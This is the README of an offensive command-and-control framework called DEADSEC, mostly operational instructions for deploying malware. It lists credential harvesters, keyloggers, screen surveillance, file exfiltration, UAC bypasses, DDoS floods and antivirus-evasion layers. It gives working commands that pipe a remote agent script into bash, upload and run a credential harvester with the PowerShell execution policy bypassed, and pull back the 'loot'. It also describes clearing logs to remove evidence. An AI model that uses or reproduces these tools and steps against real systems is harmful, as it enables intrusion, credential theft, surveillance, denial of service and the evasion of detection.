# 💀 DEADSEC // Command & Control Framework

```
╔═══════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ███████╗ █████╗ ██████╗ ███████╗███████╗ ██████╗                ║
║   ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝                ║
║   ██║  ██║█████╗  ███████║██║  ██║███████╗█████╗  ██║                     ║
║   ██║  ██║██╔══╝  ██╔══██║██║  ██║╚════██║██╔══╝  ██║                     ║
║   ██████╔╝███████╗██║  ██║██████╔╝███████║███████╗╚██████╗                ║
║   ELITE CYBER OPERATIONS DIVISION // WE DO NOT FORGIVE                    ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

A professional Python-based Command & Control framework designed for elite red team operations and authorized penetration testing. Built by hackers, for hackers.

**⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️**

## Features

### C&C Server
- **Web GUI Dashboard**: Intuitive web interface for non-CLI users 🌐
- **Bot Management**: Register and manage multiple bots
- **Remote Command Execution**: Execute shell commands on connected bots
- **File Transfer**: Upload and download files to/from bots
- **REST API**: Simple HTTP API for all operations
- **SSH Protocol**: Uses Paramiko for secure SSH connections
- **Error Handling**: Robust error handling and automatic reconnection
- **One-Click Payloads**: Deploy all payloads with single button clicks

### Agent Payloads
- **Cross-Platform**: Python, Bash, and PowerShell agents
- **Auto-Registration**: Agents automatically register with C&C
- **Multi-Method Persistence**: Registry, systemd, cron, scheduled tasks, startup
- **Stealth Mode**: Silent execution with minimal output
- **Auto-Reconnect**: Automatic retry and re-registration on failure
- **No Dependencies**: Python agent works with or without requests library
- **Daemon Mode**: Background execution on Unix-like systems

### Post-Exploitation Modules

**Python-Based (Cross-Platform):**
- **Credential Harvester**: Extract browser passwords, SSH keys, WiFi passwords
- **Keylogger**: Cross-platform keystroke capture with timestamps
- **Screenshot Capture**: Automated screen surveillance
- **Network Scanner**: Host discovery and port scanning
- **File Exfiltrator**: Pattern-based sensitive file collection
- **Privilege Escalation Checker**: Automated privesc vector detection

**Native Windows PowerShell (No Python Required):**
- **Windows Credential Harvester**: Browser passwords, WiFi, saved credentials, SSH keys
- **Windows Keylogger**: Keyboard hook-based keystroke capture
- **Windows Screenshot**: Native .NET screenshot capture
- **Windows Network Scanner**: Multi-threaded host/port scanning
- **Windows File Exfiltrator**: Pattern-based file search with archiving
- **Windows Privilege Escalation Checker**: 12+ escalation vector checks
- **� Windows Privilege Escalation Exploit**: UAC bypass, admin account creation, registry manipulation
- **�💥 Windows DDoS Attack Module**: Multi-vector distributed denial of service attacks

**👑 Privilege Escalation Capabilities:**
- **UAC Bypass**: FodHelper, EventVwr, Sdclt, ComputerDefaults exploits
- **Disable UAC**: Registry modification to disable User Account Control
- **Admin Account Creation**: Create new administrator accounts with auto-login
- **User Elevation**: Add current user to Administrators group
- **Service Exploitation**: Detect and exploit unquoted service paths
- **SAM Database Dumping**: Extract password hashes (requires SYSTEM)
- **AlwaysInstallElevated**: Check and exploit MSI elevation vulnerability
- **Scheduled Task Abuse**: Create tasks running as SYSTEM

**💥 DDoS Attack Capabilities:**
- **HTTP Flood**: Overwhelm web servers with rapid HTTP requests
- **TCP SYN Flood**: Exhaust connection tables on any TCP service
- **UDP Flood**: Saturate bandwidth with massive UDP packet storms
- **Slowloris Attack**: Connection exhaustion with minimal bandwidth
- **DNS Amplification**: High-bandwidth attacks via DNS reflection

**🛡️ Antivirus Evasion Infrastructure:**
- **AMSI Bypass**: 3 methods to disable Windows PowerShell script scanning
- **ETW Bypass**: Disable PowerShell logging and event tracing
- **String Obfuscation**: Multi-layer encoding (Base64, Hex, Unicode)
- **Variable Randomization**: Random variable/function names to break signatures
- **Multi-Layer Encryption**: XOR + Base64 + ROT13 encryption
- **Compression**: Zlib/GZip compression to transform file signatures
- **Junk Code Injection**: Benign code to confuse static analysis
- **Polymorphic Wrappers**: Unique hash on every execution
- **VM/Sandbox Detection**: 8+ checks to detect analysis environments
- **Sleep Evasion**: Timing-based sandbox bypass
- **Anti-Debugging**: Multiple debugger detection techniques
- **Payload Splitting**: Multi-part payloads reassembled at runtime
- **Reflection Execution**: .NET reflection-based code execution
- **Process Injection**: In-memory execution without disk writes
- **Mutex Protection**: Single instance enforcement

**💉 Evasion Effectiveness:**
- **Before Evasion**: ~95% AV detection rate
- **After Full Evasion**: ~5-30% AV detection rate
- **Bypass Windows Defender**: ✅ Yes (AMSI/ETW bypass)
- **Bypass Commercial AVs**: ✅ Most (see effectiveness matrix)
- **15 Python Evasion Layers**: Complete transformation
- **16 PowerShell Evasion Layers**: Maximum stealth

## 🚀 Quick Reference for Red Teamers

**New to this framework?** See [RED_TEAM_GUIDE.md](RED_TEAM_GUIDE.md) for comprehensive deployment instructions.

**Prefer Web GUI?** See [WEB_GUI_GUIDE.md](WEB_GUI_GUIDE.md) for intuitive dashboard usage (perfect for non-CLI users).

**Targets without Python?** See [WINDOWS_PAYLOADS_GUIDE.md](WINDOWS_PAYLOADS_GUIDE.md) for native PowerShell payloads.

**C&C Integration?** See [CNC_INTEGRATION_GUIDE.md](CNC_INTEGRATION_GUIDE.md) for payload deployment via C&C server.

**💥 DDoS Attacks?** See [DDOS_ATTACK_GUIDE.md](DDOS_ATTACK_GUIDE.md) for multi-vector distributed denial of service attacks.

**🛡️ Antivirus Evasion?** See [AV_EVASION_GUIDE.md](AV_EVASION_GUIDE.md) for 31 advanced techniques to bypass antivirus detection.

**Quick Deploy:**
```bash
# 1. Start C&C server
python src/cnc_server.py

# 2. Build evaded payloads (optional but recommended)
python build_evaded_payload.py

# 3. Configure and build payload
python build_payload.py --all --server http://YOUR_IP:5000 --password TARGET_SSH_PASS

# 4. Deploy configured payload
curl http://your-server/configured_payloads/linux_agent.sh | bash
```

## Requirements

- Python 3.7+
- Flask
- Paramiko
- Requests (for Python agent, optional)

## Installation

1. **Clone or download this repository**

2. **Create a virtual environment (recommended)**
   ```bash
   python -m venv .venv
   .venv\Scripts\activate  # On Windows
   source .venv/bin/activate  # On Linux/Mac
   ```

3. **Install dependencies**
   ```bash
   pip install flask paramiko
   ```

## Quick Start

### Option A: Web GUI (Easiest - No CLI Required)

**Perfect for team members who prefer graphical interfaces:**

1. **Start the C&C server**
   ```bash
   python src/cnc_server.py
   ```

2. **Open your browser**
   ```
   http://localhost:5000
   ```

3. **Deploy agents on targets** (they'll appear in the GUI automatically)

4. **Use the dashboard** to:
   - Select bots from the list
   - Deploy payloads with one-click buttons
   - Execute custom commands
   - Upload/download files

**See [WEB_GUI_GUIDE.md](WEB_GUI_GUIDE.md) for complete usage instructions.**

### Option B: Automated Deployment (CLI Using Payloads)

**For CLI users who want automated agent deployment:**

1. **Start the C&C server** (see detailed instructions below)

2. **Choose and configure a payload** from the `payloads/` directory:
   - `python_agent.py` - Cross-platform (Windows/Linux/macOS)
   - `linux_agent.sh` - Native bash for Linux systems
   - `windows_agent.ps1` - Native PowerShell for Windows

3. **Build evaded versions (RECOMMENDED):**
   ```bash
   # Build all evaded payloads
   python build_evaded_payload.py
   
   # Output: evaded_payloads/ directory with AV-evaded files
   ```

4. **Edit the payload configuration:**
   ```python
   CNC_SERVER = "http://YOUR_SERVER_IP:5000"
   SSH_PASSWORD = "target_ssh_password"
   ```

5. **Deploy to target system:**
   ```bash
   # Linux (use evaded version if built)
   scp evaded_payloads/evaded_linux_agent.sh user@target:/tmp/
   ssh user@target "bash /tmp/evaded_linux_agent.sh"
   
   # Or remotely
   curl http://your-server/evaded_linux_agent.sh | bash
   ```

6. **Bot automatically registers and establishes persistence**

See the [Payloads README](payloads/README.md) for detailed deployment instructions and methods.

### Option B: Manual Registration

If you prefer manual bot registration or already have SSH access:

## Usage

### 1. Start the CnC Server

Navigate to the project root directory and run:

```bash
python src/cnc_server.py
```

The server will start on `http://127.0.0.1:5000` by default.

You should see output like:
```
 * Running on http://127.0.0.1:5000
 * Debug mode: on
```

### 2. Register a Bot

Add a bot to the C&C server using the `/add_bot` endpoint:

**Using curl:**
```bash
curl -X POST http://127.0.0.1:5000/add_bot -H "Content-Type: application/json" -d "{\"bot_id\": \"bot1\", \"host\": \"192.168.1.100\", \"port\": 22, \"username\": \"user\", \"password\": \"password123\"}"
```

**Using PowerShell:**
```powershell
Invoke-RestMethod -Uri "http://127.0.0.1:5000/add_bot" -Method POST -ContentType "application/json" -Body '{"bot_id": "bot1", "host": "192.168.1.100", "port": 22, "username": "user", "password": "password123"}'
```

**Parameters:**
- `bot_id`: Unique identifier for the bot (string)
- `host`: IP address or hostname of the target machine (string)
- `port`: SSH port (integer, typically 22)
- `username`: SSH username (string)
- `password`: SSH password (string)

**Response:**
```json
{"status": "success"}
```

### 3. Execute Commands on a Bot

Send shell commands to a registered bot using the `/send_command` endpoint:

**Using curl:**
```bash
curl -X POST http://127.0.0.1:5000/send_command -H "Content-Type: application/json" -d "{\"bot_id\": \"bot1\", \"command\": \"whoami\"}"
```

**Using PowerShell:**
```powershell
Invoke-RestMethod -Uri "http://127.0.0.1:5000/send_command" -Method POST -ContentType "application/json" -Body '{"bot_id": "bot1", "command": "whoami"}'
```

**Parameters:**
- `bot_id`: The ID of the bot to execute the command on (string)
- `command`: The shell command to execute (string)

**Response:**
```json
{
  "stdout": "root\n",
  "stderr": ""
}
```

**Example Commands:**
```bash
# List files
curl -X POST http://127.0.0.1:5000/send_command -H "Content-Type: application/json" -d "{\"bot_id\": \"bot1\", \"command\": \"ls -la\"}"

# Check system info
curl -X POST http://127.0.0.1:5000/send_command -H "Content-Type: application/json" -d "{\"bot_id\": \"bot1\", \"command\": \"uname -a\"}"

# Get current directory
curl -X POST http://127.0.0.1:5000/send_command -H "Content-Type: application/json" -d "{\"bot_id\": \"bot1\", \"command\": \"pwd\"}"
```

### 4. Download Files from a Bot

Download files from a bot to the C&C server using the `/download_file` endpoint:

**Using curl:**
```bash
curl -X POST http://127.0.0.1:5000/download_file -H "Content-Type: application/json" -d "{\"bot_id\": \"bot1\", \"remote_path\": \"/home/user/data.txt\", \"local_path\": \"./downloaded_data.txt\"}"
```

**Using PowerShell:**
```powershell
Invoke-RestMethod -Uri "http://127.0.0.1:5000/download_file" -Method POST -ContentType "application/json" -Body '{"bot_id": "bot1", "remote_path": "/home/user/data.txt", "local_path": "./downloaded_data.txt"}'
```

**Parameters:**
- `bot_id`: The ID of the bot (string)
- `remote_path`: Full path to the file on the bot (string)
- `local_path`: Where to save the file locally (string)

**Response:**
```json
{"status": "success"}
```

### 5. Upload Files to a Bot

Upload files from the C&C server to a bot using the `/upload_file` endpoint:

**Using curl:**
```bash
curl -X POST http://127.0.0.1:5000/upload_file -H "Content-Type: application/json" -d "{\"bot_id\": \"bot1\", \"local_path\": \"./script.sh\", \"remote_path\": \"/tmp/script.sh\"}"
```

**Using PowerShell:**
```powershell
Invoke-RestMethod -Uri "http://127.0.0.1:5000/upload_file" -Method POST -ContentType "application/json" -Body '{"bot_id": "bot1", "local_path": "./script.sh", "remote_path": "/tmp/script.sh"}'
```

**Parameters:**
- `bot_id`: The ID of the bot (string)
- `local_path`: Path to the local file to upload (string)
- `remote_path`: Where to save the file on the bot (string)

**Response:**
```json
{"status": "success"}
```

## API Endpoints Summary

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/add_bot` | POST | Register a new bot |
| `/send_command` | POST | Execute a command on a bot |
| `/download_file` | POST | Download a file from a bot |
| `/upload_file` | POST | Upload a file to a bot |

## Error Handling

All endpoints return appropriate error responses:

**Bot not found (404):**
```json
{
  "status": "error",
  "message": "Bot not found"
}
```

**Connection/execution error (500):**
```json
{
  "status": "error",
  "message": "Authentication failed."
}
```

## Security Notes

⚠️ **IMPORTANT**: This is a demonstration project. Do not use this for any illegal activities.

- Credentials are stored in memory only (lost on server restart)
- No encryption for stored credentials
- SSH connections are created per-request (not persistent)
- No authentication required for API access
- Debug mode is enabled by default

## Troubleshooting

**Connection refused:**
- Ensure SSH is enabled on the target machine
- Verify the correct IP address and port
- Check firewall settings

**Authentication failed:**
- Verify username and password are correct
- Ensure the user has SSH access permissions

**Module not found:**
- Make sure Flask and Paramiko are installed: `pip install flask paramiko`

## Project Structure

```
.
├── Readme.md                        # Main documentation
├── RED_TEAM_GUIDE.md               # Comprehensive deployment guide
├── FRAMEWORK_SUMMARY.md             # Feature summary
├── QUICK_REFERENCE.md              # Quick command reference
├── PAYLOAD_QUICK_REF.md            # Payload deployment guide (Python-based)
├── WINDOWS_PAYLOADS_GUIDE.md       # Native Windows PowerShell payloads guide
├── CNC_INTEGRATION_GUIDE.md        # C&C server integration & automation
├── ENGAGEMENT_CHECKLIST.md         # Professional engagement checklist
├── build_payload.py                # Payload configuration tool
├── test_framework.py               # Framework test suite
├── src/
│   ├── bot.py                      # Bot class with SSH operations
│   └── cnc_server.py               # Flask server with API endpoints
└── payloads/
    ├── README.md                          # Detailed payload documentation
    # Initial Access Agents
    ├── python_agent.py                    # Cross-platform Python agent
    ├── linux_agent.sh                     # Native Linux bash agent
    ├── windows_agent.ps1                  # Native Windows PowerShell agent
    # Python Post-Exploitation (requires Python on target)
    ├── credential_harvester.py            # Password & credential extraction
    ├── keylogger.py                       # Keystroke capture
    ├── screenshot_capture.py              # Screen surveillance
    ├── network_scanner.py                 # Network reconnaissance
    ├── file_exfiltrator.py                # Sensitive file collection
    ├── privesc_checker.py                 # Privilege escalation detector
    # Native Windows PowerShell (NO Python required)
    ├── windows_credential_harvester.ps1   # Browser, WiFi, SSH, saved credentials
    ├── windows_keylogger.ps1              # Keyboard hook keylogger
    ├── windows_screenshot.ps1             # Native .NET screenshots
    ├── windows_network_scanner.ps1        # Multi-threaded network scan
    ├── windows_file_exfiltrator.ps1       # File search & archiving
    └── windows_privesc_checker.ps1        # 12+ privilege escalation checks
```

## Deployment Workflow

### Phase 1: Initial Access
1. **Set up C&C Server**
   - Configure and start `cnc_server.py`
   - Note your server IP address

2. **Prepare Payloads**
   - Use `build_payload.py` to configure agents
   - Set C&C server IP and SSH credentials

3. **Deploy Agents**
   - Execute payload on target system
   - Agent auto-registers and establishes persistence
   - Verify connection in C&C

### Phase 2: Post-Exploitation
4. **Reconnaissance**
   - Deploy `network_scanner.py` to map environment
   - Run `privesc_checker.py` to identify escalation paths

5. **Credential Harvesting**
   - Deploy `credential_harvester.py` to extract stored passwords
   - Use `keylogger.py` for real-time credential capture

6. **Surveillance & Collection**
   - Deploy `screenshot_capture.py` on high-value targets
   - Use `file_exfiltrator.py` to collect sensitive documents

7. **Data Exfiltration**
   - Download collected data via C&C `download_file` endpoint
   - Archive and analyze harvested intelligence

### Phase 3: Cleanup
8. **Remove Evidence**
   - Stop all running payloads
   - Delete payload files
   - Remove persistence mechanisms
   - Clear relevant logs

## Payload Capabilities

### Initial Access Agents
- ✅ Automatic registration with C&C server
- ✅ Multiple persistence mechanisms (survive reboots)
- ✅ System information gathering
- ✅ Keep-alive beacon functionality
- ✅ Cross-platform support

### Post-Exploitation Modules (Python-Based)
- ✅ **Credential Harvesting**: Browser passwords, SSH keys, WiFi credentials, history
- ✅ **Keylogging**: Real-time keystroke capture with timestamps
- ✅ **Screenshots**: Automated screen surveillance at intervals
- ✅ **Network Scanning**: Host discovery, port scanning, service identification
- ✅ **File Exfiltration**: Pattern-based search with automatic archiving
- ✅ **Privesc Detection**: Automated privilege escalation vector identification

### Native Windows PowerShell Modules (NO Python Required)
- ✅ **Windows Credential Harvester**: Chrome/Edge/Firefox passwords, WiFi credentials, saved Windows credentials, SSH keys, RDP history, PowerShell history, environment secrets
- ✅ **Windows Keylogger**: Native C# keyboard hook for real-time keystroke capture with active window tracking
- ✅ **Windows Screenshot**: Native .NET screenshot capture at configurable intervals
- ✅ **Windows Network Scanner**: Multi-threaded ping sweep and port scanning with hostname/MAC resolution
- ✅ **Windows File Exfiltrator**: Pattern-based file search with ZIP archiving and content keyword search
- ✅ **Windows Privesc Checker**: 12+ checks including AlwaysInstallElevated, unquoted service paths, writable services, SeImpersonatePrivilege, registry passwords, and more

## 🎯 Targets Without Python?

**No problem!** If target systems don't have Python installed, use these options:

### Option 1: Native Agents (Recommended)
- **Windows targets**: Use `windows_agent.ps1` (PowerShell is built into Windows)
- **Linux targets**: Use `linux_agent.sh` (Bash is on every Linux system)

### Option 2: Native Windows PowerShell Payloads
Deploy post-exploitation without Python using the `windows_*.ps1` modules:

```powershell
# Via C&C after windows_agent.ps1 connects
# Upload native PowerShell payload
curl -X POST http://localhost:5000/upload_file -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "local_path": "payloads/windows_credential_harvester.ps1", "remote_path": "C:\\Temp\\harvest.ps1"}'

# Execute it
curl -X POST http://localhost:5000/send_command -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\harvest.ps1"}'

# Download results
curl -X POST http://localhost:5000/download_file -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "remote_path": "C:\\Temp\\harvested_credentials", "local_path": "./loot/"}'
```

### Option 3: Convert Python to Executables
Use PyInstaller to create standalone .exe files from Python payloads:

```bash
pip install pyinstaller

# Create standalone executables
pyinstaller --onefile --noconsole payloads/credential_harvester.py
pyinstaller --onefile --noconsole payloads/keylogger.py
pyinstaller --onefile --noconsole payloads/screenshot_capture.py

# Upload .exe via C&C /upload_file endpoint
```

### Option 4: Install Python Remotely
Via C&C command execution on Windows targets:

```powershell
# Download Python installer
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile "C:\\Temp\\python.exe"

# Install silently
Start-Process C:\\Temp\\python.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
```

## License

For educational purposes only.
